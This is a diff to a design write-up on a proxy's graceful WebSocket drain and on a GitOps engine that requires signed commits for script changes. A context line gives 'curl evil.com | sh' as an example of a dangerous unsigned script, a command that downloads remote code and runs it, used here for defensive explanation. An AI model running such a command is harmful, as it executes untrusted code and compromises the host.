@@ -447,7 +447,7 @@ pub fn build_close_frame(status: u16) -> Vec<u8> {
 }
 ```
 
-Here's the honest state of it: `build_close_frame` exists and is unit-tested, but it is **not yet sent on the live drain path**. Today a draining backend's WebSockets are held open as tracked in-flight connections, and at the drain deadline they're torn down via a cancellation token rather than a graceful 1001 handshake. Wiring the frame into the splice -- write it into the client half, wait a grace period, then close -- is a tracked follow-up. (The HTTP side of drain-termination *is* wired: past the deadline a new request to a terminating backend gets a 503 and an in-flight response stops mid-stream.)
+This frame now goes out on the live drain path. When a draining backend's deadline arrives, the WebSocket splice stops copying, writes `build_close_frame(1001)` into the client half and shuts it down, with a short timeout so a stuck client can't hold the drain (`CLOSE_FRAME_TIMEOUT` in `src/wrapper/websocket.rs`). The client sees Going Away and reconnects instead of reporting an error. One wrinkle: the splice copies bytes, not frames, so if the deadline lands in the middle of a backend frame the client gets a protocol error instead. Either way it's bounded. (The HTTP side of drain-termination works the same way: past the deadline a new request to a terminating backend gets a 503 and an in-flight response stops mid-stream.)
 
 ## Lettuce: the GitOps engine
 
@@ -512,7 +512,7 @@ When a git provider sends a push webhook, Lettuce validates it with three checks
 
 Here's a subtle security requirement. An unsigned commit that changes `image = "redis:7"` to `image = "redis:8"` is probably fine. An unsigned commit that adds `script = "curl evil.com | sh"` is definitely not.
 
-Lettuce auto-enforces commit signing for any commit that adds or modifies a `script` field, regardless of the global `require_signed_commits` setting. The check happens by diffing the commit against its parent and searching for added lines containing "script".
+Lettuce auto-enforces commit signing for any commit that adds, changes or removes a `script` value, regardless of the global `require_signed_commits` setting. The first version diffed the commit against its parent and grepped the added lines for "script". That missed an edit inside a multi-line script body (no changed line mentions `script`), a deletion, and a `git diff` that failed with empty output. So now Lettuce parses the TOML instead: `script_values` in `src/lettuce/verify.rs` collects every `script` value, at any depth, from the last applied tree and from the new one, and any difference needs a signature from a trusted key. If the previous tree can't be read or parsed, the commit counts as changing scripts. On the first sync there's no previous tree, so any script at all needs a signature.
 
 ### Back-off on failure
 
